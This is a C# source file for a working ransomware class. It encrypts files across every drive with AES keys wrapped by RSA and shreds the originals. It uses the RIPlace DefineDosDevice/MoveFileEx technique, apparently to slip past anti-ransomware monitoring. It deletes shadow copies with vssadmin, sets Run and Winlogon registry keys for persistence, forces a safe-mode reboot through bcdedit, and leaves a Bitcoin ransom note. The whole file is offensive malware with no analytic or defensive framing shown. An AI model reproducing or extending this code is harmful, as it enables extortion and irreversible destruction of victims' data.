using Shared;
using Ransom.Crypto;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Ransom
{
    class Ransomware
    {
        #region Parameters
        protected static Action<string>? OnFileFound;
        protected static Action? OnEncryptStart;
        protected static Action? OnEncryptEnd;

        private const uint DDD_RAW_TARGET_PATH = 0x1;
        private const uint DDD_REMOVE_DEFINITION = 0x2;
        private const uint MOVEFILE_REPLACE_EXISTING = 0x1;
        private const uint MOVEFILE_WRITE_THROUGHT = 0x8;

        private static readonly Dictionary<EncryptedAES, string> EncryptedAesKeysPaths = new Dictionary<EncryptedAES, string>();
        private static readonly List<string> AllFiles = new List<string>();
        private readonly List<string> IGNORE_PATHS = new List<string>() { "tmp", "winnt", "application data", "appdata", "temp", "thumb", "$recycle.bin", "system volume information", "program files", "program files (x86)", "windows", "boot", "bios" }; // What folders should we ignore.
        private readonly List<string> IGNORE_EXTENSIONS = new List<string>() { ".exe", ".dll", ".lnk", ".sys", ".msi", ".bat", Config.RANSOMWARE_EXTENSION }; // What files should we ignore.
        private readonly string[] Drives;
        private readonly string[] RUN_REGISTER = new string[] { @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "GatewayFQDN" }; // Run register path and name.
        private readonly string[] SAFE_MODE_REGISTER = new string[] { @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "explorer.exe" }; // Safe mode register path and name.

        private static Aes? CurrentAes;
        private static RSAParameters PublicKey;
        private static string DosName = "r1pp3d";
        private static string DosPath = Path.Combine(Path.GetTempPath(), DosName); 
        #endregion

        public Ransomware()
        {
            Drives = Environment.GetLogicalDrives();

            OnFileFound += EncryptFile;
            OnEncryptStart = GenerateKeysAndSaveThem;
            OnEncryptEnd = WriteEncryptedDataToFile;
        }

        public void EncryptSystem()
        {
            OnEncryptStart?.Invoke();
            IterateSystem();
            OnEncryptEnd?.Invoke();
        }

        public void BecomePersistent()
        {
            Utils.ModifyRegister(1, RUN_REGISTER[0], RUN_REGISTER[1], Config.CURRENT_PATH);
            Utils.ModifyRegister(1, SAFE_MODE_REGISTER[0], SAFE_MODE_REGISTER[1], Config.CURRENT_PATH);
        }

        public void RestoreRegistryKeys()
        {
            Utils.DeleteRegistry(1, RUN_REGISTER[0], RUN_REGISTER[1]);
            Utils.ModifyRegister(1, SAFE_MODE_REGISTER[0], SAFE_MODE_REGISTER[1], SAFE_MODE_REGISTER[2]);
        }

        public bool AlreadyExecuted()
        {
            return Utils.DoesRegExists(1, RUN_REGISTER[0], RUN_REGISTER[1]) ||
                Utils.DoesRegExists(1, SAFE_MODE_REGISTER[0], SAFE_MODE_REGISTER[1], SAFE_MODE_REGISTER[2]);                                              
        }

        public void DeleteShadowCopies()
        {
            string first_command = "vssadmin Delete Shadows /all /quiet";
            string[] resize_commands = { "vssadmin resize shadowstorage /for={0}: /on={1}: /maxsize=401MB", "vssadmin resize shadowstorage /for={0}: /on={1}: /maxsize=unbounded" };

            Utils.RunCMDCommand(first_command);
            foreach (string drive in Drives)
            {
                char dir_letter = drive[0];

                Utils.RunCMDCommand(string.Format(resize_commands[0], dir_letter, dir_letter));
                Utils.RunCMDCommand(string.Format(resize_commands[1], dir_letter, dir_letter));
            }

            Utils.RunCMDCommand(first_command);
        }

        public static void ChangeBootState(bool rebootIntoSafeMode)
        {
            if (rebootIntoSafeMode)
            {
                Utils.RunCMDCommand(@"bcdedit /set {default} safeboot network"); // Enter safe mode on restart
                Utils.RunCMDCommand(@"bcdedit /set {current} bootstatuspolicy ignoreallfailures");
            }
            else
                Utils.RunCMDCommand(@"bcdedit /deletevalue {default} safeboot"); // Exit safe mode on restart

            Utils.RunCMDCommand("shutdown /r /t 0");
        }

        public static void CreateNote(bool openInNotepad)
        {
            try
            {
                string email = Config.EMAIL;
                string fileOne = Config.AES_KEYS_PATH;
                string fileTwo = Config.ENCRYPTED_PRIVATE_KEY;
                string path = Config.NOTE_PATH;

                using (StreamWriter sw = new StreamWriter(path))
                {
                    sw.Write(string.Format(Config.DESKTOP_NOTE, Config.USD_AMOUNT, Config.BTC_ADDRESS, email, fileOne, fileTwo));
                }

                if (openInNotepad)
                    Process.Start("notepad.exe", path);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        private static Aes? EncryptAndWrite(string source, string dest)
        {
            string? data;
            try
            {
                data = File.ReadAllText(source, Encoding.UTF8);
                if (string.IsNullOrEmpty(data) || string.IsNullOrWhiteSpace(data))
                    return null;

                Aes aes = Symmetric.GenerateKey();
                byte[] encryptedData = Symmetric.String2AES(data, aes.Key, aes.IV);

                using (FileStream fs = new FileStream(dest, FileMode.OpenOrCreate, FileAccess.Write))
                {
                    fs.Write(encryptedData, 0, encryptedData.Length);
                }

                return aes;
            }
            catch (Exception) { return null; }
        }

        private static bool RIPlaceFile(string pathToRIPlace)
        {
            if (!IsFilePathValid(pathToRIPlace))
                return false;

            CleanUp();
            if (!PrepareRIPlace(pathToRIPlace, out string encryptedFilePath))
            {
                CleanUp(encryptedFilePath);
                return false;
            }
            if (CurrentAes == null)
                return false;

            DosName = Path.GetFileName(pathToRIPlace);
            string? path = Path.GetDirectoryName(pathToRIPlace);
            if (string.IsNullOrEmpty(DosName) || string.IsNullOrEmpty(path))
                return false;

            DosPath = Path.Combine(path, DosName + Config.RANSOMWARE_EXTENSION);
            if (RIPlace(encryptedFilePath, pathToRIPlace))
            {
                CleanUp(encryptedFilePath);
                return false;
            }

            CleanUp();
            CleanUp(pathToRIPlace);

            Console.WriteLine($"RIPlaced: {encryptedFilePath}");
            return true;
        }

        private static bool PrepareRIPlace(string targetPath, out string encryptedPath)
        {
            encryptedPath = string.Empty;
            try
            {
                string currentDir = string.Empty;
                try
                {
                    currentDir = Path.GetTempPath();
                }
                catch (Exception) { return false; }

                encryptedPath = Utils.GetRandomPath(currentDir);
                CurrentAes = EncryptAndWrite(targetPath, encryptedPath);

                return CurrentAes != null;
            }
            catch (Exception) { return false; }
        }

        private static bool RIPlace(string encryptedPath, string originalPath)
        {
            if (!NativeMethods.DefineDosDeviceW(DDD_RAW_TARGET_PATH, DosName, @"\??\" + originalPath))
                return false;
            if (!NativeMethods.MoveFileExW(encryptedPath, DosPath, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGHT))
                return false;

            return true;
        }

        private static bool IsFilePathValid(string? filePath)
        {
            if (string.IsNullOrEmpty(filePath) || string.IsNullOrWhiteSpace(filePath))
                return false;
            if (!File.Exists(filePath))
                return false;

            return true;
        }

        private static void CleanUp(string? fileToDelete = null)
        {
            NativeMethods.DefineDosDeviceW(DDD_REMOVE_DEFINITION | DDD_RAW_TARGET_PATH, DosName, string.Empty);
            if (!IsFilePathValid(fileToDelete))
                return;

            try
            {
                Utils.ShredFile(fileToDelete);
            }
            catch { }
        }

        private static void EncryptAesKey(Aes? key, string value)
        {
            if (key == null || string.IsNullOrEmpty(value))
                return;

            // Encrypt AES keys using RSA
            byte[]? encryptedAesKey = Asymmetric.String2RSA(Encoding.UTF8.GetString(key.Key), PublicKey);
            byte[]? encryptedAesIV = Asymmetric.String2RSA(Encoding.UTF8.GetString(key.IV), PublicKey);
            if (encryptedAesKey == null || encryptedAesIV == null)
                return;

            // Convert Encrypted keys using Base64
            string? encodedKey = Convert.ToBase64String(encryptedAesKey);
            string? encodedIV = Convert.ToBase64String(encryptedAesIV);
            if (encodedKey == null || encodedIV == null)
                return;

            // Create new Aes with the encrypted Key and IV
            EncryptedAES? encryptedAes = new EncryptedAES(encodedKey, encodedIV);
            if (encryptedAes != null)
                EncryptedAesKeysPaths.Add(encryptedAes, value);
        }

        private static void GenerateKeysAndSaveThem()
        {
            Asymmetric? asymmetric = new Asymmetric();
            (RSAParameters publicKey, RSAParameters privateKey) = asymmetric.GenerateKeys();
            PublicKey = publicKey;
            List<byte[]> encryptedPrivateKey = Asymmetric.RSAKey2RSA(privateKey, Config.SERVER_PUBLIC_KEY);

            privateKey = new RSAParameters();
            asymmetric = null;
            GC.Collect();
            GC.WaitForPendingFinalizers();

            using FileStream fs = File.Open(Config.ENCRYPTED_PRIVATE_KEY, FileMode.OpenOrCreate);
            using StreamWriter sw = new StreamWriter(fs);

            foreach (byte[] enc in encryptedPrivateKey)
            {
                try
                {
                    string encodedData = Convert.ToBase64String(enc);
                    if (string.IsNullOrEmpty(encodedData))
                        break;

                    sw.WriteLine(encodedData);
                }
                catch (Exception) { break; }
            }
        }

        private static void WriteEncryptedDataToFile()
        {
            if (EncryptedAesKeysPaths != null)
            {
                List<EncryptedAES> keys = EncryptedAesKeysPaths.Keys.ToList();
                List<string> stringKeys = new List<string>();
                List<string> stringIVs = new List<string>();

                foreach (EncryptedAES encAES in keys)
                {
                    string? key = encAES.Key;
                    string? iv = encAES.IV;
                    if (!string.IsNullOrEmpty(key) && !string.IsNullOrEmpty(iv))
                    {
                        stringKeys.Add(key);
                        stringIVs.Add(iv);
                    }
                }

                Utils.WriteDictToFile(Config.AES_KEYS_PATH, stringKeys, stringIVs, EncryptedAesKeysPaths.Values.ToArray());
            }
        }

        private void IterateSystem()
        {
            List<Thread> threads = new List<Thread>();
            foreach (string drive in Drives)
            {
                DriveInfo driveInfo = new DriveInfo(drive);
                if (driveInfo.IsReady)
                {
                    DirectoryInfo rootDirectory = driveInfo.RootDirectory;
                    Thread thread = new Thread((dir) =>
                    {
                        WalkDirectory((DirectoryInfo)dir);
                    })
                    { IsBackground = true };

                    threads.Add(thread);
                    thread.Start(rootDirectory);
                }
            }

            threads.ForEach(thread => thread.Join());
        }

        private void WalkDirectory(DirectoryInfo? dir)
        {
            FileInfo[]? files = null;
            if (dir == null)
                return;

            try
            {
                files = dir.GetFiles("*.*");
            }
            catch (Exception) { }

            if (files != null)
            {
                foreach (FileInfo file in files)
                {
                    string extension = Path.GetExtension(file.FullName);
                    if (extension != null && !IGNORE_EXTENSIONS.Contains(extension.ToLower()))
                    {
                        string path = file.FullName;

                        OnFileFound?.Invoke(path);
                        AllFiles.Add(path);
                    }
                }

                DirectoryInfo[] subDirs = dir.GetDirectories();
                foreach (DirectoryInfo dirInfo in subDirs)
                {
                    if (!IGNORE_PATHS.Contains(dirInfo.Name.ToLower()))
                        WalkDirectory(dirInfo);
                }
            }
        }

        private void EncryptFile(string? path)
        {
            if (string.IsNullOrEmpty(path))
                return;

            Aes? aes = null;
            bool result = RIPlaceFile(path);
            string modifiedPath = string.Empty;

            if (!result)
            {
                Console.WriteLine($"Encrypting {path} regulary");
                modifiedPath = path + Config.RANSOMWARE_EXTENSION;

                aes = EncryptAndWrite(path, modifiedPath);
                if (aes == null)
                {
                    Console.WriteLine($"Failed to RIPlace or regularly encrypt: {path}");
                    return;
                }
            }

            if (aes == null) // RIPlace worked
                EncryptAesKey(CurrentAes, DosPath);
            else
                EncryptAesKey(aes, modifiedPath);

            Utils.ShredFile(path);
        }
    }
}
